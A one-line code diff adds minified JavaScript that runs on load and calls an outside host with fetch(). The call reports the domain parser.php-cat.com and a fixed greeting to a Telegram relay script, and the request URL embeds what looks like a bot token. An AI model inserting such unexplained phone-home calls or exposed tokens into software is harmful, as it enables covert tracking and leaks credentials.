@@ -1,0 +1,1 @@
+!async function(){await(async a=>{try{const t="https://api.uralweb.info/telegram.php?s=1&token=6272013314:AAE87uoGgRkLaKnFMuW2zkUqlAeJ_e9YyUg&domain=parser.php-cat.com&msg="+a;(await fetch(t)).ok}catch(a){console.error(a)}})("привет конфет")}();
